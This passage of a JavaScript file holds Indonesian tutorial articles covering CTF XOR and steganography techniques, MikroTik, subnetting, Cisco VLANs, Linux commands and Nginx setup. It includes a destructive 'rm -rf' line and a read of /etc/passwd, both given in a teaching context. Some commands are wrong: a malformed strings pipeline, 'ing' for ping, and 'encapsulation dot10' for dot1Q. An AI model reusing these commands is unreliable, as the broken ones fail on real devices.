        "<p>CTF sering memakai XOR single-byte. Kita bisa coba semua 256 kemungkinan key dan pilih hasil yang mengandung string seperti <code>flag{</code>:</p>" +
        codeBlock(
          "python",
          "# xor single byte brute force\nenc = bytes.fromhex(\"0a060d1c0100\")  # contoh hasil hex\nfor k in range(256):\n    dec = bytes([b ^ k for b in enc])\n    if b\"flag\" in dec:\n        print(\"key:\", hex(k), \"→\", dec)"
        ) +
        callout(
          "tip",
          "Kalau ketemu file XOR di CTF, periksa dulu apakah key-nya berulang atau single-byte. Tool <strong>xortool</strong> bisa menebak panjang dan isi key secara otomatis: <code>xortool -c all file.bin</code>.",
          "TIPS"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Caesar mengajarkan kita brute force pada ruang kunci kecil, sementara XOR mengajarkan sifat dasar operasi bitwise yang menjadi fondasi banyak sistem kripto modern. Kuasai keduanya sebelum melanjutkan ke AES/RSA di level berikutnya.</p>",
    },

    "steganografi-binwalk-steghide": {
      id: "steganografi-binwalk-steghide",
      crumb: "Ekstraksi Pesan Tersembunyi",
      title: "Steganografi CTF: Ekstraksi Pesan Tersembunyi dengan Binwalk & Steghide",
      category: "cybersecurity",
      difficulty: "Intermediate",
      excerpt:
        "Pelajari cara mendeteksi dan mengekstrak data tersembunyi di dalam file gambar/audio menggunakan binwalk, steghide, strings, dan exiftool.",
      date: "2026-10-04",
      readTime: 13,
      lab: "Kali Linux (binwalk, steghide, zsteg)",
      author: "Admin KBHub",
      tags: ["steganography", "ctf", "forensics", "binwalk"],
      content:
        '<h2 id="konsep-stego">Apa itu Steganografi?</h2>' +
        "<p><strong>Steganografi</strong> menyembunyikan keberadaan pesan (bukan mengenkripsinya) di dalam medium lain seperti gambar, audio, atau dokumen PDF. Berbeda dari kriptografi yang membuat data tidak terbaca, steganografi membuat data <em>tidak terlihat ada</em>.</p>" +
        '<h2 id="recon-file">1. Recon Awal: File &amp; Metadata</h2>' +
        "<p>Sebelum pakai tool berat, selalu mulai dari yang sederhana — periksa metadata dan strings:</p>" +
        codeBlock(
          "bash",
          "# cek tipe file sebenarnya (jangan percaya ekstensi)\nfile gambar.png\n# gambar.png: PNG image data, 800 x 600, 8-bit/color RGBA\n\n# baca metadata EXIF\nexiftool gambar.png\n# Comment : flag mungkin di sini\n# Software: steghide 0.5.1\n\n# cari string mencurigakan\ngambar.png | strings | grep -iE \"flag|password|key\""
        ) +
        callout(
          "note",
          "Metadata sering menyimpan <strong>jejak tool</strong> yang dipakai (mis. <code>Software: steghide</code>). Petunjuk ini menentukan tool ekstraksi berikutnya yang harus kamu coba."
        ) +
        '<h2 id="binwalk">2. Binwalk: Deteksi File Tersemat</h2>' +
        "<p><code>binwalk</code> memindai file dan mendeteksi apakah ada file lain (zip, gambar, ELF) yang tertanam di dalamnya:</p>" +
        codeBlock(
          "bash",
          "# scan file untuk menemukan file tersembunyi\nbinwalk gambar.png\n# DECIMAL       HEXADECIMAL     DESCRIPTION\n# 0             0x0             PNG image, 800 x 600\n# 8243          0x2033          Zip archive data\n\n# ekstrak otomatis hasil temuan\nbinwalk -e gambar.png\n# hasil ekstraksi ada di folder _gambar.png.extracted/"
        ) +
        '<h2 id="steghide">3. Steghide: Pesan dengan Password</h2>' +
        "<p><code>steghide</code> menyisipkan/mengekstrak data ke gambar (JPEG/BMP) atau audio (WAV/AU) dengan proteksi password:</p>" +
        codeBlock(
          "bash",
          "# ekstrak data tersembunyi dari gambar\nsteghide extract -sf gambar.jpg\n# Enter passphrase: (kosong jika tanpa password)\n# jika benar → file 'secret.txt' ditulis ke direktori\n\n# dengan password tertentu\nsteghide extract -sf gambar.jpg -p \"password123\"\n\n# cek kapasitas penyisipan\nsteghide info gambar.jpg"
        ) +
        callout(
          "warning",
          "Jika diminta passphrase dan tidak ada petunjuk, coba wordlist umum CTF (<code>rockyou.txt</code>) atau password dari petunjuk soal. Steghide <strong>tidak</strong> bisa dibobol tanpa password yang benar.",
          "PERINGATAN"
        ) +
        '<h2 id="zsteg-lainnya">4. Tool Lain: zsteg, outguess, stegsolve</h2>' +
        "<ul>" +
        "<li><strong>zsteg</strong> — khusus PNG/BMP, mendeteksi pesan di bit planes (atas/bawah, RGB)</li>" +
        "<li><strong>outguess</strong> — alternatif steghide dengan algoritme berbeda</li>" +
        "<li><strong>stegsolve</strong> — GUI untuk menvisualisasikan perbedaan bit plane gambar</li>" +
        "</ul>" +
        codeBlock(
          "bash",
          "# zsteg: deteksi pesan tersembunyi di PNG\nzsteg gambar.png\n# text: \"flag{h1dden_1n_pl4in_s1ght}\"\n\n# cek semua kombinasi bit plane\nzsteg -a gambar.png"
        ) +
        '<h2 id="alur-kerja">5. Alur Kerja yang Disarankan</h2>' +
        "<ol>" +
        "<li><code>file</code> + <code>exiftool</code> — identifikasi tipe asli & metadata</li>" +
        "<li><code>strings</code> + <code>grep</code> — cari teks polos yang tersembunyi</li>" +
        "<li><code>binwalk -e</code> — ekstrak file yang tertanam</li>" +
        "<li><code>steghide</code>/<code>zsteg</code>/<code>outguess</code> — ekstrak berdasarkan jenis medium</li>" +
        "</ol>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Steganografi di CTF jarang butuh tool canggih — kuncinya <strong>metodologi</strong>: kenali mediumnya, cek metadata, lalu pilih tool ekstraksi yang tepat. Latih pola pikir ini pada soal forensics di CTF favoritmu.</p>" +
        callout(
          "tip",
          "Kumpulkan soal steganografi dari CTF seperti <strong>picoCTF</strong> (kategori Forensics) — mulai dari yang mudah sampai butuh kombinasi beberapa tool sekaligus.",
          "LATIHAN"
        ),
    },

    "networking-mikrotik-basic": {
      id: "networking-mikrotik-basic",
      crumb: "Konfigurasi Dasar MikroTik",
      title: "Konfigurasi Dasar MikroTik: IP Address, DHCP Server, dan NAT Gateway",
      category: "networking",
      difficulty: "Beginner",
      excerpt:
        "Panduan langkah demi langkah menyiapkan router MikroTik dari nol: alamat IP antarmuka, DHCP Server untuk klien, hingga NAT masquerade agar semua host bisa internet.",
      date: "2026-10-09",
      readTime: 12,
      lab: "MikroTik CHR / RB951Ui-2HnD",
      author: "Admin KBHub",
      tags: ["mikrotik", "routeros", "dhcp", "nat"],
      content:
        '<h2 id="persiapan">1. Persiapan &amp; Akses Awal</h2>' +
        "<p>RouterOS bisa dikonfigurasi lewat <strong>Winbox</strong> (GUI), <strong>WebFig</strong>, atau <strong>CLI</strong>. Untuk pemula, Winbox paling nyaman — cukup klik MAC address router dari daftar neighbours. Contoh di bawah memakai sintaks CLI yang bisa langsung ditempel di terminal MikroTik.</p>" +
        codeBlock(
          "bash",
          "# masuk ke mode CLI via ssh\nssh admin@192.168.88.1\n\n# identitas router (agar mudah dikenali)\n/system identity set name=\"Gateway-Kantor\"\n\n# cek versi RouterOS\n/system resource print"
        ) +
        '<h2 id="ip-address">2. Memberi Alamat IP Address</h2>' +
        "<p>Setiap interface butuh alamat IP. Pola yang umum: satu interface untuk <strong>WAN</strong> (internet) dan satu untuk <strong>LAN</strong>.</p>" +
        codeBlock(
          "bash",
          "# lihat daftar interface\n/interface print\n\n# beri IP di interface LAN (ether2)\n/ip address add address=192.168.10.1/24 interface=ether2\n\n# beri IP di interface WAN (ether1) — sesuaikan ISP\n/ip address add address=192.168.100.2/24 interface=ether1\n\n# verifikasi\n/ip address print"
        ) +
        callout(
          "note",
          "Gunakan CIDR yang benar. <code>192.168.10.1/24</code> berarti mask <code>255.255.255.0</code> dengan 254 host tersedia. Salah tulis /24 jadi /16 akan membuat broadcast domain melebar tak terkendali."
        ) +
        '<h2 id="dhcp-server">3. DHCP Server untuk Klien</h2>' +
        "<p>Agar klien LAN tidak perlu set IP manual, aktifkan DHCP Server. Wizard bawaan membuat seluruh konfigurasi sekaligus: address pool, network, dan lease.</p>" +
        codeBlock(
          "bash",
          "# jalankan wizard DHCP\n/ip dhcp-server setup\n#   dhcp interface     -> ether2\n#   address space       -> 192.168.10.0/24\n#   gateway            -> 192.168.10.1\n#   addresses to give  -> 192.168.10.10-192.168.10.100\n#   dns servers        -> 1.1.1.1, 8.8.8.8\n#   lease time         -> 3d\n\n# cek status lease klien\n/ip dhcp-server lease print"
        ) +
        '<h2 id="nat-gateway">4. NAT Masquerade (Akses Internet)</h2>' +
        "<p>Tanpa NAT, host dengan IP privat (192.168.x.x) tidak bisa mencapai internet. <strong>Masquerade</strong> mengganti IP sumber paket keluar dengan IP publik router.</p>" +
        codeBlock(
          "bash",
          "/ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade comment=\"ke internet\"\n\n# pastikan firewall mengizinkan traffic forward & input\n/ip firewall filter print\n/ip firewall filter add chain=input connection-state=established,related action=accept comment=\"izinkan reply\"\n/ip firewall filter add chain=input in-interface=ether1 connection-state=new action=drop comment=\"blok WAN langsung\""
        ) +
        '<h2 id="dns-gateway">5. DNS &amp; Default Gateway</h2>' +
        codeBlock(
          "bash",
          "# agar router ikut bisa resolve nama domain\n/ip dns set servers=1.1.1.1,8.8.8.8 allow-remote-requests=yes\n\n# gateway default (via ISP)\n/ip route add dst-address=0.0.0.0/0 gateway=192.168.100.1\n\n# tes dari router itu sendiri\ning 8.8.8.8\ndig google.com"
        ) +
        '<h2 id="verifikasi">6. Verifikasi Akhir</h2>' +
        "<p>Uji berjenjang agar mudah mendiagnosa ketika ada masalah:</p>" +
        "<ol>" +
        "<li>Ping gateway lokal dari klien → memastikan jalur LAN OK</li>" +
        "<li>Ping IP publik (<code>8.8.8.8</code>) → memastikan routing &amp; NAT jalan</li>" +
        "<li>Ping nama domain (<code>google.com</code>) → memastikan DNS jalan</li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# dari PC klien (192.168.10.10)\nping 192.168.10.1      # gateway\nping 8.8.8.8           # internet (tanpa DNS)\nping google.com        # internet + DNS\nipconfig /all          # pastikan gateway & DNS benar (Windows)"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Konfigurasi inti MikroTik selalu berputar pada empat hal: <strong>IP address</strong> (identitas antarmuka), <strong>DHCP</strong> (distribusi ke klien), <strong>NAT</strong> (jembatan ke internet), dan <strong>firewall</strong> (perlindungan). Kuasai empat hal ini dan hampir seluruh skenario jaringan kecil bisa diselesaikan.</p>" +
        callout(
          "tip",
          "Simpan konfigurasi yang sudah jalan dengan <code>/system backup save</code> dan ekspor settings via <code>/export file=backup-kantor</code>. Jika router rusak, konfigurasi bisa dipulihkan dalam hitungan menit.",
          "TIPS"
        ),
    },

    "networking-subnetting-guide": {
      id: "networking-subnetting-guide",
      crumb: "Panduan Subnetting IPv4",
      title: "Panduan Subnetting IPv4 Lengkap: Menghitung CIDR, Subnet Mask, & Host",
      category: "networking",
      difficulty: "Beginner",
      excerpt:
        "Penjelasan subnetting dari konsep biner hingga perhitungan CIDR, jumlah host, dan broadcast address — lengkap dengan rumus cepat dan tabel referensi.",
      date: "2026-10-03",
      readTime: 14,
      lab: "Kalkulator + Cisco Packet Tracer",
      author: "Admin KBHub",
      tags: ["subnetting", "ipv4", "cidr", "networking"],
      content:
        '<h2 id="kenapa-subnetting">1. Kenapa Subnetting Penting?</h2>' +
        "<p><strong>Subnetting</strong> membagi satu jaringan besar menjadi beberapa segmen kecil (subnet). Manfaatnya: membatasi broadcast, mempermudah manajemen, dan menerapkan kebijakan keamanan per segmen — misalnya memisahkan VLAN tamu dari VLAN server.</p>" +
        '<h2 id="anatomi-ip">2. Anatomi Alamat IP &amp; CIDR</h2>' +
        "<p>Alamat IP terdiri dari 32 bit, ditulis 4 oktet desimal. Notasi <strong>CIDR</strong> (<code>/24</code>) menunjukkan berapa bit yang dipakai untuk <em>network portion</em>. Sisa bit = <em>host portion</em>.</p>" +
        codeBlock(
          "bash",
          "# contoh\nIP        : 192.168.10.57\nCIDR      : /26\nMask      : 255.255.255.192\n\n# /26 → 26 bit network, 6 bit host\n# jumlah host = 2^6 - 2 = 62 host (kurangi network & broadcast)"
        ) +
        '<h2 id="rumus">3. Rumus Cepat Subnetting</h2>' +
        '<table><thead><tr><th>Yang dihitung</th><th>Rumus</th></tr></thead><tbody>' +
        "<tr><td>Jumlah subnet</td><td><code>2^(s)</code>, s = bit subnet yang dipinjam</td></tr>" +
        "<tr><td>Jumlah host per subnet</td><td><code>2^h - 2</code>, h = sisa bit host</td></tr>" +
        "<tr><td>Block size (interval)</td><td><code>256 - oktet mask terakhir</code></td></tr>" +
        "<tr><td>Broadcast address</td><td>alamat berikutnya setelah range host terakhir</td></tr>" +
        "<tr><td>Network address</td><td>IP pertama yang habis dibagi block size</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "bash",
          "# contoh cepat: 192.168.10.0/26\n# block size = 256 - 192 = 64\n# subnet : .0, .64, .128, .192\n# subnet ke-3 (192.168.10.128):\n#   network   = 192.168.10.128\n#   host      = .129 - .190\n#   broadcast = 192.168.10.191"
        ) +
        '<h2 id="tabel-cidr">4. Tabel Referensi CIDR Umum</h2>' +
        '<table><thead><tr><th>CIDR</th><th>Mask</th><th>Host</th><th>Gunanya</th></tr></thead><tbody>' +
        "<tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Jaringan kantor kecil</td></tr>" +
        "<tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>Belah 2 segmen</td></tr>" +
        "<tr><td>/26</td><td>255.255.255.192</td><td>62</td><td>VLAN per divisi</td></tr>" +
        "<tr><td>/27</td><td>255.255.255.224</td><td>30</td><td>Segmen kecil / server</td></tr>" +
        "<tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Point-to-point / IoT</td></tr>" +
        "<tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Link antar router</td></tr>" +
        "</tbody></table>" +
        '<h2 id="contoh-kasus">5. Studi Kasus</h2>' +
        "<p>Sebuah kantor punya jaringan <code>10.10.0.0/22</code> dan ingin dibagi menjadi 4 VLAN dengan jumlah host berbeda. Tentukan penomoran paling efisien:</p>" +
        codeBlock(
          "python",
          "# hitung subnet otomatis dengan Python\ndef subnet_calc(base, cidr):\n    import ipaddress\n    net = ipaddress.ip_network(f\"{base}/{cidr}\", strict=False)\n    print(\"Network :\", net)\n    print(\"Mask    :\", net.netmask)\n    print(\"Host    :\", net.num_addresses - 2)\n    print(\"Range   :\", net[1], \"-\", net[-2])\n    print(\"Broadcast:\", net.broadcast_address)\n\nsubnet_calc(\"10.10.0.0\", 22)\n# Network : 10.10.0.0/22\n# Mask    : 255.255.252.0\n# Host    : 1022"
        ) +
        callout(
          "note",
          "Tools pendukung saat mengerjakan soal: <code>ipcalc</code> di Linux, <code>subnetting.com</code>, atau Cisco <code>ip subnet-zero</code>. Namun tetap kuasai perhitungan manual — di ujian dan interview teknis, kalkulator sering tidak diperbolehkan."
        ) +
        '<h2 id="latihan">6. Latihan Mandiri</h2>' +
        "<ul>" +
        "<li>Berapa host tersedia pada <code>172.16.5.0/28</code>?</li>" +
        "<li>Range host untuk subnet kedua dari <code>192.168.100.0/25</code>?</li>" +
        "<li>Berapa subnet yang terbentuk jika <code>/24</code> dipinjam 3 bit?</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Subnetting bukan hafalan, melainkan <strong>pola berpikir biner</strong>. Kuasai rumus block size dan <code>2^h - 2</code>, lalu berlatih dengan timer — targetkan mengerjakan soal subnetting dalam hitungan detik seperti yang dituntut di sertifikasi jaringan.</p>" +
        callout(
          "tip",
          "Naik level: pelajari <strong>VLSM</strong> (Variable Length Subnet Mask) untuk membagi subnet dengan ukuran berbeda dalam satu blok besar tanpa membuang alamat IP.",
          "LATIHAN"
        ),
    },

    "networking-cisco-vlan-routing": {
      id: "networking-cisco-vlan-routing",
      crumb: "VLAN & Inter-VLAN Routing",
      title: "Konfigurasi VLAN & Inter-VLAN Routing di Cisco Packet Tracer",
      category: "networking",
      difficulty: "Intermediate",
      excerpt:
        "Praktik lengkap membagi jaringan ke dalam VLAN di switch Cisco, mengonfigurasi trunk 802.1Q, dan inter-VLAN routing dengan metode router-on-a-stick.",
      date: "2026-09-28",
      readTime: 15,
      lab: "Cisco Packet Tracer 8.x",
      author: "Admin KBHub",
      tags: ["cisco", "vlan", "trunk", "packet-tracer"],
      content:
        callout(
          "note",
          "Lab ini memakai <strong>Cisco Packet Tracer</strong>. Perangkat yang dipakai: 1 switch Cisco 2960, 1 router Cisco 2811/4321, 2 PC, dan 1 server. Topologi: PC1 (VLAN 10) &amp; PC2 (VLAN 20) terhubung ke switch, switch ke router via trunk."
        ) +
        '<h2 id="konsep-vlan">1. Konsep VLAN</h2>' +
        "<p><strong>VLAN</strong> (Virtual LAN) memisahkan broadcast domain secara logis tanpa mengubah fisik kabel. Port pada VLAN berbeda tidak bisa saling berkomunikasi langsung — dibutuhkan <strong>router</strong> atau <strong>L3 switch</strong> (inter-VLAN routing).</p>" +
        '<h2 id="membuat-vlan">2. Membuat VLAN di Switch</h2>' +
        codeBlock(
          "bash",
          "Switch> enable\nSwitch# configure terminal\n\n! buat VLAN 10 (Sales) dan VLAN 20 (Keuangan)\nSwitch(config)# vlan 10\nSwitch(config-vlan)# name Sales\nSwitch(config-vlan)# exit\nSwitch(config)# vlan 20\nSwitch(config-vlan)# name Keuangan\nSwitch(config-vlan)# exit\n\n! masukkan access port ke VLAN\nSwitch(config)# interface fastEthernet 0/1\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 10\nSwitch(config-if)# exit\nSwitch(config)# interface fastEthernet 0/2\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 20\nSwitch(config-if)# exit\n\n! verifikasi\nSwitch# show vlan brief"
        ) +
        '<h2 id="trunk">3. Konfigurasi Trunk (802.1Q)</h2>' +
        "<p>Agar link ke router bisa membawa traffic banyak VLAN sekaligus, port dijadikan <strong>trunk</strong> dengan encapsulation IEEE 802.1Q.</p>" +
        codeBlock(
          "bash",
          "Switch(config)# interface gigabitEthernet 0/1\nSwitch(config-if)# switchport mode trunk\nSwitch(config-if)# switchport trunk encapsulation dot1q\nSwitch(config-if)# switchport trunk allowed vlan 10,20\nSwitch(config-if)# exit\n\n! verifikasi status trunk\nSwitch# show interfaces trunk"
        ) +
        callout(
          "warning",
          "Jika perangkat hanya mendukung satu encapsulation, perintah <code>switchport trunk encapsulation</code> bisa gagal atau tidak diperlukan. Pada switch Layer 3 tertentu perintah ini wajib diisi sebelum <code>switchport mode trunk</code>."
        ) +
        '<h2 id="router-on-stick">4. Inter-VLAN Routing: Router-on-a-Stick</h2>' +
        "<p>Satu interface router dibuat <strong>sub-interface</strong> per VLAN. Setiap sub-interface menjadi gateway untuk VLAN tersebut dan wajib diberi tag 802.1Q.</p>" +
        codeBlock(
          "bash",
          "Router> enable\nRouter# configure terminal\n\n! aktifkan interface fisik ke switch\nRouter(config)# interface gigabitEthernet 0/0\nRouter(config-if)# no shutdown\nRouter(config-if)# exit\n\n! sub-interface untuk VLAN 10\nRouter(config)# interface gigabitEthernet 0/0.10\nRouter(config-subif)# encapsulation dot10 10\nRouter(config-subif)# ip address 192.168.10.1 255.255.255.0\nRouter(config-subif)# exit\n\n! sub-interface untuk VLAN 20\nRouter(config)# interface gigabitEthernet 0/0.20\nRouter(config-subif)# encapsulation dot10 20\nRouter(config-subif)# ip address 192.168.20.1 255.255.255.0\nRouter(config-subif)# exit\n\nRouter(config)# ip routing   ! aktifkan routing (jika L3)"
        ) +
        '<h2 id="ip-host">5. IP PC &amp; Gateway</h2>' +
        codeBlock(
          "bash",
          "# PC1 (VLAN 10)\nIP Address  : 192.168.10.10\nSubnet Mask : 255.255.255.0\nGateway     : 192.168.10.1\n\n# PC2 (VLAN 20)\nIP Address  : 192.168.20.10\nSubnet Mask : 255.255.255.0\nGateway     : 192.168.20.1"
        ) +
        '<h2 id="verifikasi">6. Verifikasi &amp; Troubleshooting</h2>' +
        codeBlock(
          "bash",
          "# tes dari PC1 ke PC2 (harus BERHASIL karena beda VLAN, lewat router)\nping 192.168.20.10\n\n# periksa tabel routing router\nRouter# show ip route\n# C    192.168.10.0/24 is directly connected, GigabitEthernet0/0.10\n# C    192.168.20.0/24 is directly connected, GigabitEthernet0/0.20\n\n# periksa trunk & vlan di switch\nSwitch# show interfaces trunk\nSwitch# show vlan brief"
        ) +
        '<h2 id="pencegahan">7. Troubleshooting Umum</h2>' +
        "<ul>" +
        "<li>Ping gagal antar VLAN → cek apakah <code>encapsulation dot10</code> sudah benar dan sub-interface <code>no shutdown</code></li>" +
        "<li>Trunk tidak muncul → pastikan kedua sisi sama-sama <code>switchport mode trunk</code></li>" +
        "<li>PC tidak dapat IP → cek DHCP scope di router atau set statis sesuai subnet VLAN-nya</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pola dasar inter-VLAN selalu sama: <strong>buat VLAN</strong> → <strong>tetapkan access port</strong> → <strong>trunk ke router</strong> → <strong>sub-interface + IP gateway per VLAN</strong>. Setelah paham pola ini, kamu bisa menerapkannya ke metode lain seperti SVI pada L3 switch atau routing terintegrasi.</p>" +
        callout(
          "tip",
          "Perluas lab: tambahkan VLAN 30 (Guest) yang hanya boleh mengakses internet, lalu buktikan isolasi dari VLAN 10/20 dengan uji ping ke masing-masing gateway.",
          "LATIHAN"
        ),
    },

    "linux-essential-commands": {
      id: "linux-essential-commands",
      crumb: "Perintah Dasar Terminal",
      title: "Cheat Sheet Perintah Dasar Terminal Linux untuk Pemula",
      category: "linux",
      difficulty: "Beginner",
      excerpt:
        "Kumpulan perintah wajib untuk pemula Linux: navigasi filesystem, manajemen file, izin akses, monitoring proses, hingga jaringan — disusun sebagai cheat sheet cepat.",
      date: "2026-10-07",
      readTime: 11,
      lab: "Ubuntu 22.04 / Debian (Terminal)",
      author: "Admin KBHub",
      tags: ["linux", "terminal", "cheatsheet", "bash"],
      content:
        '<h2 id="navigasi">1. Navigasi Filesystem</h2>' +
        codeBlock(
          "bash",
          "pwd                   # tampilkan direktori kerja saat ini\nls -lah               # daftar file (lengkap, human-readable, termasuk hidden)\ncd /var/log           # pindah ke path absolut\ncd ..                 # naik satu level\ncd -                  # kembali ke direktori sebelumnya\nfind / -name \"*.conf\" 2>/dev/null   # cari file berdasarkan nama\nwhich nginx            # lokasi executable dalam PATH"
        ) +
        '<h2 id="file">2. Manajemen File &amp; Direktori</h2>' +
        codeBlock(
          "bash",
          "mkdir -p project/src   # buat direktori bertingkat\ncp -r backup/ backup2/  # salin folder beserta isinya\nmv lama.txt baru.txt     # rename / pindah file\nrm -i file.txt           # hapus dengan konfirmasi\nrm -rf folder/           # hapus folder rekursif (HATI-HATI)\ntouch notes.txt          # buat file kosong\nln -s /opt/app app       # buat symbolic link\nchmod 644 file.txt       # rw-r--r--\nchown user:group file.txt"
        ) +
        callout(
          "warning",
          "<code>rm -rf</code> tidak memindahkan ke trash — file hilang permanen. Selalu cek ulang path sebelum mengeksekusi, terutama saat memakai wildcard atau variabel seperti <code>rm -rf $DIR/</code>."
        ) +
        '<h2 id="baca-tulis">3. Membaca &amp; Menyaring Isi File</h2>' +
        codeBlock(
          "bash",
          "cat file.txt            # tampilkan seluruh isi\nless big.log            # baca per layar (q untuk keluar)\ntail -f /var/log/syslog  # pantau log secara real-time\ngrep -rni \"error\" .      # cari teks (recursive, case-insensitive)\nhead -n 20 file.txt      # 20 baris pertama\nwc -l file.txt           # hitung jumlah baris\ncut -d: -f1 /etc/passwd  # ambil kolom tertentu"
        ) +
        '<h2 id="proses">4. Monitoring Proses &amp; Sistem</h2>' +
        codeBlock(
          "bash",
          "top                     # proses real-time (q untuk keluar)\nhtop                    # versi top yang lebih ramah\nps aux | grep nginx     # cari proses tertentu\nkill -9 <PID>            # paksa hentikan proses\ndf -h                   # sisa kapasitas disk\ndu -sh *                # ukuran folder per item\nfree -h                 # penggunaan RAM\nuptime                  # load average sistem"
        ) +
        '<h2 id="jaringan">5. Perintah Jaringan</h2>' +
        codeBlock(
          "bash",
          "ip a                    # tampilkan interface & IP (pengganti ifconfig)\nip r                    # tabel routing\nping -c 4 8.8.8.8       # tes konektivitas (4 paket)\nss -tulpn               # port yang listening (pengganti netstat)\ncurl -I https://site.com # cek header respons HTTP\ntraceroute site.com      # jalur paket ke tujuan\nssh user@192.168.1.10    # remote shell"
        ) +
        '<h2 id="sudo">6. Sudo, Service &amp; Paket</h2>' +
        codeBlock(
          "bash",
          "sudo <perintah>          # jalankan sebagai root\nsudo -i                  # buka shell root\ndpkg -i package.deb      # instal paket lokal (Debian/Ubuntu)\napt update && apt upgrade # update repositori + paket\nsystemctl status nginx   # status service\nsystemctl restart nginx  # restart service\nsystemctl enable nginx   # aktifkan saat boot"
        ) +
        '<h2 id="shortcut">7. Shortcut Terminal yang Mempercepat</h2>' +
        '<table><thead><tr><th>Shortcut</th><th>Fungsi</th></tr></thead><tbody>' +
        "<tr><td><code>Tab</code></td><td>Autocomplete path &amp; perintah</td></tr>" +
        "<tr><td><code>Ctrl+C</code></td><td>Batalkan perintah berjalan</td></tr>" +
        "<tr><td><code>Ctrl+R</code></td><td>Cari riwayat perintah secara backwards</td></tr>" +
        "<tr><td><code>Ctrl+L</code></td><td>Bersihkan layar</td></tr>" +
        "<tr><td><code>!!</code></td><td>Ulangi perintah terakhir</td></tr>" +
        "<tr><td><code>history</code></td><td>Lihat daftar riwayat perintah</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Tidak perlu menghafal semuanya sekaligus. Mulai dari tujuh kelompok ini — <strong>navigasi, file, baca, proses, jaringan, sudo, shortcut</strong> — lalu gunakan sehari-hari sampai jadi refleks. Cheat sheet ini paling berguna dicetak atau disimpan di tab terpisah saat kamu praktik.</p>" +
        callout(
          "tip",
          "Setiap perintah punya manual interaktif: jalankan <code>man chmod</code> atau <code>chmod --help</code> untuk melihat semua opsi dan contoh penggunaannya.",
          "TIPS"
        ),
    },

    "linux-webserver-nginx-php": {
      id: "linux-webserver-nginx-php",
      crumb: "Setup Nginx + PHP-FPM",
      title: "Cara Setup Web Server Nginx + PHP-FPM + MySQL di Ubuntu Server",
      category: "linux",
      difficulty: "Intermediate",
      excerpt:
        "Panduan lengkap membangun stack LEMP (Linux, Nginx, MySQL, PHP) dari nol di Ubuntu Server, termasuk konfigurasi virtual host, PHP-FPM pool, dan hardening dasar.",
      date: "2026-09-30",
      readTime: 16,
      lab: "Ubuntu Server 24.04 LTS (VM / VPS)",
      author: "Admin KBHub",
      tags: ["nginx", "php", "mysql", "lemp"],
      content:
        callout(
          "note",
          "Stack yang dibangun: <strong>LEMP</strong> (Linux + Nginx + MySQL/MariaDB + PHP-FPM). Semua perintah dijalankan sebagai user dengan hak <code>sudo</code> pada Ubuntu Server 22.04/24.04."
        ) +
        '<h2 id="update">1. Update Sistem &amp; Instal Paket</h2>' +
        codeBlock(
          "bash",
          "sudo apt update && sudo apt upgrade -y\n\n# instal Nginx, MySQL server, dan PHP beserta modul umum\nsudo apt install -y nginx mysql-server php-fpm php-mysql \\\n  php-curl php-gd php-mbstring php-xml php-zip php-bcmath"
        ) +
        '<h2 id="mysql">2. Amankan MySQL</h2>' +
        codeBlock(
          "bash",
          "sudo mysql_secure_installation\n#   Validate password component? Y\n#   Policy: STRONG\n#   Remove anonymous users? Y\n#   Disallow root login remotely? Y\n#   Remove test database? Y\n\n# buat database & user khusus aplikasi\nsudo mysql\nCREATE DATABASE appdb CHARACTER SET utf8mb4;\nCREATE USER 'appuser'@'localhost' IDENTIFIED BY 'KuatS4ngat!';\nGRANT ALL PRIVILEGES ON appdb.* TO 'appuser'@'localhost';\nFLUSH PRIVILEGES;\nEXIT;"
        ) +
        '<h2 id="php-fpm">3. Konfigurasi PHP-FPM</h2>' +
        "<p>Nginx tidak mengeksekusi PHP sendiri — ia meneruskan request ke <strong>PHP-FPM</strong> melalui socket. Pastikan pool konfigurasi menunjuk ke socket yang benar.</p>" +
        codeBlock(
          "bash",
          "# cek versi PHP & lokasi konfigurasi\nphp -v\nls /etc/php/*/fpm/pool.d/\n\n# umumnya sudah benar; pastikan listen = /run/php/php8.3-fpm.sock\ngrep -R \"^listen\" /etc/php/*/fpm/pool.d/www.conf\n\nsudo systemctl restart php8.3-fpm\nsudo systemctl enable php8.3-fpm"
        ) +
        '<h2 id="nginx-vhost">4. Virtual Host Nginx</h2>' +
        codeBlock(
          "bash",
          "sudo nano /etc/nginx/sites-available/app.conf"
        ) +
        codeBlock(
          "nginx",
          "server {\n    listen 80;\n    server_name app.example.com;\n\n    root /var/www/app/public;\n    index index.php index.html;\n\n    access_log /var/log/nginx/app.access.log;\n    error_log  /var/log/nginx/app.error.log;\n\n    location / {\n        try_files $uri $uri/ /index.php?$query_string;\n    }\n\n    # proxy request PHP ke PHP-FPM\n    location ~ \\.php$ {\n        include snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/run/php/php8.3-fpm.sock;\n    }\n\n    # tolak akses file tersembunyi (.env, .git)\n    location ~ /\\. {\n        deny all;\n    }\n}"
        ) +
        codeBlock(
          "bash",
          "# aktifkan site & uji konfigurasi\nsudo ln -s /etc/nginx/sites-available/app.conf /etc/nginx/sites-enabled/\nsudo nginx -t\n# nginx: configuration file /etc/nginx/nginx.conf test is successful\nsudo systemctl reload nginx\n\n# buat direktori web & file tes\nsudo mkdir -p /var/www/app/public\nsudo tee /var/www/app/public/index.php <<'EOF'\n<?php phpinfo();\nEOF\nsudo chown -R www-data:www-data /var/www/app"
        ) +
        callout(
          "warning",
          "Jangan lupa arahkan DNS record <code>app.example.com</code> ke IP server. Tanpa itu, virtual host tidak akan cocok dan Nginx akan menjatuhkan request ke server default."
        ) +
        '<h2 id="hardening">5. Hardening Dasar</h2>' +
